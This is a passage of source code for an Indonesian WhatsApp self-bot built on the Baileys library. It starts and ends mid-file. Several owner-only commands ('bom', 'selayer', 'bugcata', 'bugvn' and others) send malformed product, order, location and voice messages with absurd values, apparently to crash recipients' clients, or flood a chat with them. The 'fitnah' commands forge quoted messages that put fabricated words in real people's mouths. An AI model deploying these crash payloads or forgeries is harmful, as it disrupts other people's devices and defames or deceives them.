                  "thumbnail": fs.readFileSync('./stik/virgam.jpeg'),
                  "itemCount": 1000000000000,
                  "status": "INQUIRY",
                  "surface": "CATALOG",
                  "orderTitle": `${api}`,
                  "message": `${api}`,
                  "sellerJid": "6288293524506@s.whatsapp.net",
                  "token": "AR6i7smUt97Y2ZH037RTuxZYdqYSjHGWn61cCMak9nb69w==",
                  "contextInfo": {
                  "forwardingScore": 3,
                  "isForwarded": true
                      }
                    }
                  }, {quoted:bugtrol, contextInfo:{}}) 
                  hexa.relayWAMessage(res)
 break


	
 case 'selayer':
                   if(!mek.key.fromMe) return replyfakelink('Only owner')
                   res = hexa.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
							"productImage": {
								"url": "https://mmg.whatsapp.net/d/f/AjUT7LC_HX1aN2vGVWA1vR2bHuiXgXbaZVimHrmbyof8.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "NTOWJHw6yWanIbsg0Ak7xNdaD11EorBAFwGwfBMtYb4=",
								"fileLength": "84017",
								"height": 718,
                                "width": 720,
								"mediaKey": "i80leRoQ6VIlsg/Eg4j+oBC6PqaU+zxukfTEEItxAmc=",
                                "fileEncSha256": "viVwa2sH7/1d5YWufykk5UFTg8vOuxu36Cbm8ggsgis=",
								"jpegThumbnail": fs.readFileSync('./stik/virgam.jpeg'),
                                },
							"productId": "9999999",
							"title": `${api}`,
							"description": `${api}`,
							"productImageCount": 1
						},
						"businessOwnerJid": "6288293524506@s.whatsapp.net",
						"contextInfo": {
							"forwardingScore": 9999,
							"isForwarded": true
						}
					}
				},{quoted: bugtrol})
                  hexa.relayWAMessage(res)
break
case 'bom':
                   if(!mek.key.fromMe) return replyfakelink('Only owner')
                   res = hexa.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
							"productImage": {
								"url": "https://mmg.whatsapp.net/d/f/AjUT7LC_HX1aN2vGVWA1vR2bHuiXgXbaZVimHrmbyof8.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "NTOWJHw6yWanIbsg0Ak7xNdaD11EorBAFwGwfBMtYb4=",
								"fileLength": "84017",
								"height": 718,
                                "width": 720,
								"mediaKey": "i80leRoQ6VIlsg/Eg4j+oBC6PqaU+zxukfTEEItxAmc=",
                                "fileEncSha256": "viVwa2sH7/1d5YWufykk5UFTg8vOuxu36Cbm8ggsgis=",
								"jpegThumbnail": fs.readFileSync('./stik/virgam.jpeg'),
                                },
							"productId": "9999999",
							"title": `${api}`,
							"description": `${api}`,
							"productImageCount": 1
						},
						"businessOwnerJid": "6288293524506@s.whatsapp.net",
						"contextInfo": {
							"forwardingScore": 9999,
							"isForwarded": true
						}
					}
				},{quoted: bugtrol})
                  hexa.relayWAMessage(res)
                  hexa.relayWAMessage(global.mm=hexa.
                  prepareMessageFromContent(`${body.slice(9)}`, hexa.
                 prepareDisappearingMessageSettingContent(0),
                 {}),{waitForAck:!0})
break

case 'bugcata':
if (!mek.key.fromMe) return
buf = fs.readFileSync('./stik/virgam.jpeg')
imeu = await hexa.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await hexa.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": buf,
"productId": "150453297177375",
"title": `mek Punya ${vipi}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "62838356237829@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: FajarGanz, thumbnail: Buffer.alloc(0)})

hexa.relayWAMessage(res)
break

 case 'bugkontak':
				if(!mek.key.fromMe) return replyfakelinkfakelink('Only owner')
				hexa.sendMessage(from, {displayname: "Jeff", vcard: vcardv}, MessageType.contact, { quoted: bugtrol})
break   

 case 'bugs':
				if(!mek.key.fromMe) return replyfakelinkfakelink('Only owner')
				if (args.length < 1) return replyfakelink('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
              hexa.sendMessage(from, fs.readFileSync('./stik/jr.webp'), sticker, {quoted: bugtrol },0)
              }
              replyfakelink('Sukses Send Bug Sebanyak '+args.join(' '))
 break   
 
 case 'bugvn':
				if(!mek.key.fromMe) return replyfakelinkfakelink('Only owner')
				if (args.length < 1) return replyfakelink('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
              hexa.sendMessage(from, fs.readFileSync('./stik/anu.mp3'), audio, {quoted: bugtrol, mimetype: 'audio/mp4', duration: 99999999999999999999, ptt:true},0)
                  }
              replyfakelink('Sukses Send Bug Sebanyak '+args.join(' '))
break

case 'jadivirgam':
				if (!mek.key.fromMe) return replyfakelink('Khusus Owner')
				if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await hexa.downloadMediaMessage(encmedia)
					sendFakeImg(from, media, arg, thumbnail, mek)
				} else if (!q) {
          sendButMessage(from, `REPLY GAMBAR NYA`, `TQ UUU LOVE YOU`, [
            {
              buttonId: `${prefix}rules`,
              buttonText: {
                displayText: `RULES`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}owner`,
              buttonText: {
                displayText: `OWNER`,
              },
              type: 1,
            },
          ]);
        }
		break
				
case 'fakeloc':
               var kntl = body.slice(8)
             var nama = kntl.split("|")[0];
		  var impostor = kntl.split("|")[1];
	   var bro = fs.readFileSync('./stik/thumb.jpeg')
     hexa.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: fs.readFileSync('./stik/thumb.jpeg') }, MessageType.location)                 
break

case 'jadivloc':                   
                 if  (!mek.key.fromMe) return replyfakelink('Only owner')
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await hexa.downloadMediaMessage(encmedia)
                   hexa.sendMessage(from, {degreesLatitude: -6.2323957,
                   degreesLongitude: 106.8626589,
                   name: `${api}`,
                   address: `${beku}`,
                   jpegThumbnail: media, },location,{
                    quoted: {
                     key: {
                      participant: '111111111@s.whatsapp.net' // Fake sender Jid
                },
                       message: {
                       orderMessage: {
                       itemCount: 1000000000000, // Bug
                       status: 100,
                       surface: 100,
                       message: `${fake}`,
                       orderTitle: '*ꭙࣼmekꭙ.in*', // 
                       sellerJid: '0@s.whatsapp.net' // Seller
                }
              }
           }
        })
        } else {
					replyfakelink(from, `Kirim gambar atau reply dengan caption ${prefix}jadivloc caption`, mek)
				}
break

case 'jadiselayer':
if(!mek.key.fromMe) return replyfakelink('Only owner')
if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
					let media = await hexa.downloadMediaMessage(encmedia)
                   res = hexa.prepareMessageFromContent(from,{
					"productMessage": {
						"product": {
							"productImage": {
								"url": "https://mmg.whatsapp.net/d/f/AjUT7LC_HX1aN2vGVWA1vR2bHuiXgXbaZVimHrmbyof8.enc",
								"mimetype": "image/jpeg",
								"fileSha256": "NTOWJHw6yWanIbsg0Ak7xNdaD11EorBAFwGwfBMtYb4=",
								"fileLength": "84017",
								"height": 718,
                                "width": 720,
								"mediaKey": "i80leRoQ6VIlsg/Eg4j+oBC6PqaU+zxukfTEEItxAmc=",
                                "fileEncSha256": "viVwa2sH7/1d5YWufykk5UFTg8vOuxu36Cbm8ggsgis=",
								"jpegThumbnail": media,
                                },
							"productId": "9999999",
							"title": `${api}`,
							"description": `${api}`,
							"productImageCount": 1
						},
						"businessOwnerJid": "6283856237829@s.whatsapp.net",
						"contextInfo": {
							"forwardingScore": 9999,
							"isForwarded": true
						}
					}
				},{quoted: bugtrol})
                  hexa.relayWAMessage(res)
              } else {
					replyfakelink(from, `Kirim gambar atau reply dengan caption ${prefix}jadiselayer caption`, mek)
				}
break

case 'nulis':
 case 'tulis':
  if (args.length < 1) return reply('Yang mau di tulis apaan?')
  teks = args.join(' ')
  reply(mess.wait)
  nulis = encodeURIComponent(teks)
  res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
  if (res.data.error) return reply(res.data.error)
  buff = Buffer.from(res.data.result.split(',')[1], 'base64')
  hexa.sendMessage(from, buff, image, {quoted: mek, caption: 'Jangan Males!!'})
  break
  
  
  case 'fliptext':
                  reply(mess.wait)
                  if (args.length < 1) return reply(`Example:\n${prefix}fliptext MyMans`)
                  quere = args.join(" ")
                  flipe = quere.split('').reverse().join('')
                  fakegroup(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
                  break
                  
case 'tohuruf':
                  if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
                  try {
                  quere = args.join(" ")
                  convertes = await toHur(quere)
                  reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
                  } catch {
                  reply(mess.error.api)
                  }
                  break
                  
case 'style':
                  if(!q) return reply('Masukkan teks!')
                  reply(mess.wait)
                  axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
                   let hasil = `*Hasil* :\n${res.data.result}`;
                   hexa.sendMessage(from, hasil, MessageType.text, { quoted: mek});
                  })
     break
 
 case 'bc':

            if (!mek.key.fromMe) return            

            if (args.length < 1) return reply('teks?')

            anu100 = await hexa.chats.all()

            if (isMedia && !hexa.message.videoMessage || isQuotedImage) {

            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek

            bc100 = await hexa.downloadMediaMessage(encmedia)

            for (let _ of anu100) {

            hexa.sendMessage(_.jid, bc100, image, {quoted: mek, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})

}

            fakeitem('Suksess broadcast')

            } else {

            for (let _ of anu100) {

            hexa.sendMessage(_.jid, 

			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,

			"footerText": '•𝑪𝒓𝒆𝒂𝒕𝒐𝒓 𝑩𝒐𝒕 𝑴𝒂𝒓𝒄𝒆𝒍',

			"buttons": [

			{"buttonId": `#menu`,

			"buttonText": 

			{"displayText": "📒 MENU BOT"

			},"type": "RESPONSE"},
			

			{"buttonId": `#owner`,
			

			"buttonText": 

			{"displayText": "👑 OWNER"
			

			},"type": "RESPONSE"},
			

			{"buttonId": `#regis`,
			

			"buttonText": 

			{"displayText": "VERIFY"
			

			},"type": "RESPONSE"},
			

			], "headerType": 'LOCATION',

			locationMessage: { degreesLatitude: '',

			degreesLongitude: '',

			jpegThumbnail: fs.readFileSync(`./stik/thumb.jpeg`),

			}}, MessageType.buttonsMessage )

}

            reply('Suksess broadcast')

}

            break
            
   case 'autoread':
                             if (!mek.key.fromMe) return
                           if (args.length < 1) return replyfakelink(`Example:\n${prefix}autoread gc on`)
                         if (args[0] === "gc") {
                       if (args.length < 2) return replyfakelink(`Example:\n${prefix}autoread gc on`)
                     if (args[1] === "on") {
                   if (readG === true) return
                 readG = true
              replyfakelink(`Succes mengaktifkan autoread group`)
           } else if (args[1] === "off") {
         if (readG === false) return
       readG = false
     replyfakelink(`Succes mematikan autoread group`)
   } else {
  replyfakelink(`Pilih on atau off`)
}
                                    } else if (args[0] === "pc") {
                                  if (args.length < 2) return replyfakelink(`Example:\n${prefix}autoread pc on`)
                                 if (args[1] === "on") {
                               if (readP === true) return
                             readP = true
                          replyfakelink(`Succes mengaktifkan autoread pribadi`)
                       } else if (args[1] === "off") {
                     if (readP === false) return
                  readP = false
               replyfakelink(`Succes mematikan autoread pribadi`)
             } else {
          replyfakelink(`Pilih on atau off`)
        }
     } else {
  replyfakelink(`*List Auto Read*\n•> gc\n•> pc`)
 }
break   

           
    case 'menua':
    	var menu = `

╭───「 *INFO* 」
│   Hai ${pushname}
│
│👑 _Prefix_ : 「 MULTI-PREFIX 」
│👑 _Lib_ : 𝑩𝒂𝒊𝒍𝒆𝒚𝒔ÏÑĎËX
│👑 _Type_ : 𝑵𝒐𝒅𝒆𝑱𝒔
│👑 _User Yg Terdaftar : ${_registered.length}
│👑 _Mode_ : ${banChats ? '𝑺𝑬𝑳𝑭' : '𝑷𝑼𝑩𝑳𝑰𝑪'}
│👑 _Status_ : ${offline ? '𝑶𝑭𝑭𝑳𝑰𝑵𝑬' : '𝑶𝑵𝑳𝑰𝑵𝑬'}
│👑 _User_ : ${prema}
│👑 _Group Chats_ : ${totalgrouppp.length}
│👑 _Private Chats_ : ${totalkontakkk.length}
│👑 _Total Chats_ : ${totalchattt.length}
│👑 _Speed_ : ${latensii.toFixed(4)} 𝑺𝒆𝒄𝒐𝒏𝒅𝒔
│
├───「 *LIST MENU* 」
│
├≽ ${prefix}menuowner
├≽ ${prefix}menueditor
├≽ ${prefix}menudwonload
├≽ ${prefix}menuother
├≽ ${prefix}menugroup
├≽ ${prefix}menulimit
├≽ ${prefix}menuanim
│
│
│
├≽ ${prefix}request
├≽ ${prefix}owner
├≽ ${prefix}sewabot
│
╰───「 *${fake}* 」`
buttons = [{buttonId: `${prefix}owner`,buttonText:{displayText: '𝐎𝐖𝐍𝐄𝐑OWNER'},type:1}]

               imageMsg = (await hexa.prepareMessageMedia(fs.readFileSync(`./stik/thumb.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/fake.jpeg`)})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText: `Jangan Lupa Suport Terus ${fake} 😊`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}

               prep = await hexa.prepareMessageFromContent(from,{buttonsMessage},{quoted: FajarGanz})
               hexa.relayWAMessage(prep)
           	break
case 'menueditor':
mis = `
╭───「 *EDITOR* 」
│
│
├───「 *PRO* 」
│
├≽ ${prefix}sticker
├≽ ${prefix}swm
├≽ ${prefix}take
├≽ ${prefix}emoji😁
├≽ ${prefix}toimg
├≽ ${prefix}fadeface
├≽ ${prefix}tourl
│
├───「 *MP4&MP3* 」
│
├≽ ${prefix}tomp3
├≽ ${prefix}tomp4
├≽ ${prefix}slow
├≽ ${prefix}fast
├≽ ${prefix}reverse
│
╰───「 *${fake}* 」`
reply(mis)            
               break


case 'menudwonload':
ini = `
╭──「 *DWONLOADR* 」
│
│${d} _${prefix}play <query>_
│${d} _${prefix}video <query>_
│${d} _${prefix}ytmp3 <link>_
│${d} _${prefix}ytmp4 <link>_
│${d} _${prefix}ig <link>_
│${d} _${prefix}igstory <username>_
│${d} _${prefix}twitter <link>_
│${d} _${prefix}tiktok <link>_
│${d} _${prefix}tiktokaudio <link>_
│${d} _${prefix}fb <link>_
│${d} _${prefix}get_
│
╰──「 *${fake}* 」`
reply(ini)
break

case 'menuother':
pajar = `
╭───「 *OTHER MENU* 」
│
│
├───「 *SETING* 」
│
├≽ ${prefix}setthumb
├≽ ${prefix}settarget
├≽ ${prefix}setfakeimg
├≽ ${prefix}setreply
├≽ ${prefix}ping
├≽ ${prefix}inspect
│
├───「 *GAMBAR & AUDIO* 」
│
├≽ ${prefix}wasted
├≽ ${prefix}tts
├≽ ${prefix}getpic
├≽ ${prefix}attp
├≽ ${prefix}pinterest
├≽ ${prefix}meme
├≽ ${prefix}darkjokes
├≽ ${prefix}cowok
├≽ ${prefix}cewek
│
├───「 *MAKER* 」
│
├≽ ${prefix}katabijak
├≽ ${prefix}pantun
├≽ ${prefix}fakta
├≽ ${prefix}wanted
├≽ ${prefix}gta
├≽ ${prefix}dota
├≽ ${prefix}pokemon
│
├───「 *SEARCH* 」
│
├≽ ${prefix}playstore
├≽ ${prefix}lirik
├≽ ${prefix}playstore
├≽ ${prefix}wiki
├≽ ${prefix}brainly
├≽ ${prefix}igstalk
├≽ ${prefix}otaku
├≽ ${prefix}komiku
├≽ ${prefix}chara
├≽ ${prefix}anime
├≽ ${prefix}image
├≽ ${prefix}ytsearch
│
├───「 *Q&U&L* 」
│
├≽ ${prefix}halah
├≽ ${prefix}hilih
├≽ ${prefix}holoh
├≽ ${prefix}heleh
├≽ ${prefix}hulu
│
├───「 *RANDOMSTIK* 」
│
├≽ ${prefix}hash
├≽ ${prefix}dadu
├≽ ${prefix}amongus
├≽ ${prefix}paimon
├≽ ${prefix}bucin
├≽ ${prefix}bengong
├≽ ${prefix}mukalu
├≽ ${prefix}doge
├≽ ${prefix}patrick
├≽ ${prefix}gura
├≽ ${prefix}stickeranime
│
├───「 *JADIBOT* 」
│
├≽ ${prefix}jadibot
├≽ ${prefix}stopjadibot
├≽ ${prefix}listbot
│
╰───「 *${fake}* 」`
reply(pajar)
break

case 'menugroup':
giip = `
╭───「 *MENUGRUP* 」
│
│
├───「 *DETKTOR* 」
│
├≽ ${prefix}leveling 1/0
├≽ ${prefix}event 1/0
├≽ ${prefix}group open\close
├≽ ${prefix}caripesan
│
├───「 *VOTE* 」
│
├≽ ${prefix}voting
├≽ ${prefix}delvote
│
├───「 *BAND* 」
│
├≽ ${prefix}ban
├≽ ${prefix}unabn
├≽ ${prefix}listban
│
├───「 *FUNGRUP* 」
│
├≽ ${prefix}fitnah
├≽ ${prefix}fitnahpc
├≽ ${prefix}kontak
├≽ ${prefix}udara
├≽ ${prefix}darat
├≽ ${prefix}laut
├≽ ${prefix}petualang
├≽ ${prefix}adv
├≽ ${prefix}iventori
├≽ ${prefix}usepotion
├≽ ${prefix}adevnture
├≽ ${prefix}mutual
│
├───「 *TAG* 」
│
├≽ ${prefix}hidetag
├≽ ${prefix}kontakg
├≽ ${prefix}sticktag
├≽ ${prefix}totag
│
╰───「 *${fake}* 」`
reply(giip)
break

case 'menulimit':
yao = `
╭──「 *LIM&PREM* 」
│
│${e} _${prefix}teransfer_
│${e} _${prefix}limit_
│${e} _${prefix}dompet_
│${e} _${prefix}potion_
│${e} _${prefix}heal_
│${e} _${prefix}buylimit_
│${e} _${prefix}giftlimit_
│${e} _${prefix}setlimit_
│${e} _${prefix}setmemlimit_
│${e} _${prefix}buypremiumlimit_
│${e} _${prefix}premium_
│${e} _${prefix}unpremium_
│${e} _${prefix}premiumlist_
│
╰──「 *${fake}* 」`
reply(yao)
break

case 'menuanim':
wiibu = `
╭───「 *WIBUU* 」
│
│
├───「 *ANIME* 」
│
├≽ ${prefix}bully
├≽ ${prefix}kiss
├≽ ${prefix}pat
├≽ ${prefix}baka
├≽ ${prefix}slap
├≽ ${prefix}poke
├≽ ${prefix}loli
├≽ ${prefix}husbu
├≽ ${prefix}milf
├≽ ${prefix}cosplay
├≽ ${prefix}wallml
├≽ ${prefix}sao
├≽ ${prefix}hsdxd
├≽ ${prefix}lovelive
├≽ ${prefix}awo
├≽ ${prefix}chara
│
├───「 *ANIM18* 」
│
├≽ ${prefix}yuri
├≽ ${prefix}lesbian
├≽ ${prefix}eroNeko
├≽ ${prefix}bj
├≽ ${prefix}pussy
├≽ ${prefix}kitsune
├≽ ${prefix}neko
├≽ ${prefix}megumin
├≽ ${prefix}shinobu
├≽ ${prefix}blowjob
├≽ ${prefix}trapnime
│
╰───「 *${fake}* `
reply(wiibu)
break

    case 'delvote':
            if(!mek.key.remoteJid) return
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
    case 'voting':
            if(!isGroupAdmins && !mek.key.fromMe) return 
            if(!isGroup) return reply(mess.only.group)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break
    case 'linkwa':
            if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break
    case 'igstory': 
            if(!q) return reply('Usernamenya?')
            hx.igstory(q)
            .then(async result => {
            for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,video,{quoted: mek,caption: `Type : ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    hexa.sendMessage(from,link,image,{quoted: mek,caption: `Type : ${i.type}`})                  
                }
            }
            });
            break
    case 'caripesan':
            if(!q)return reply('pesannya apa bang?')
            let v = await hexa.searchMessages(q,from,10,1)
            let s = v.messages
            let el = s.filter(v => v.message)
            el.shift()
            try {
            if(el[0].message.conversation == undefined) return
            reply(`Ditemukan ${el.length} pesan`)
            await sleep(3000)
            for(let i = 0; i < el.length; i++) {
            await hexa.sendMessage(from,'Nih pesannya',text,{quoted:el[i]})
            }
            } catch(e){
            reply('Pesan tidak ditemukan!')
            }           
            break
    case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
    case 'otaku':
            if(!q) return reply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
            hexa.sendMessage(from,ram,image,{quoted:mek,caption:rem})
            break
    case 'komiku':
            if(!q) return reply(`judulnya?\n${prefix}komiku mao gakuin`)
            let komik = await hx.komiku(q)
            result = `*Title* : ${komik.title}\n
*Title Indo* : ${komik.indo}\n
*Update* : ${komik.update}\n
*Desc* : ${komik.desc}\n
*Chapter Awal* : ${komik.chapter_awal}
*Chapter Akhir* : ${komik.chapter_akhir}`
            sendMediaURL(from, komik.image,result)
            break
    case 'chara':
            if(!q) return reply(`gambar apa?\n${prefix}chara nino`)
            let ima = await hx.chara(q)
            let acaki = ima[Math.floor(Math.random() * ima.length)]
            let li = await getBuffer(acaki)
            await hexa.sendMessage(from,li,image,{quoted: mek})
            break
    case 'pinterest':
            if(!q) return reply('gambar apa?')
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            let di = await getBuffer(ac)
            await hexa.sendMessage(from,di,image,{quoted: mek})
            break
    case 'playstore':
            if(!q) return reply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            reply(store)
            break
    case 'on':
            if (!mek.key.fromMe) return 
            offline = false
            fakestatus(' ```ANDA TELAH ONLINE``` ')
            break       
    case 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
    case 'off':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = q ? q : '-'
            alasan = anuu
            fakestatus(' ```ANDA TELAH OFFLINE``` ')
            break   
    case 'get':
            if(!q) return reply('linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            fakestatus(bu)
            })   
            break
    case 'kontag':
            if (!mek.key.fromMe) return reply('SELF-BOT')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            hexa.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            hexa.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await hexa.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await hexa.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
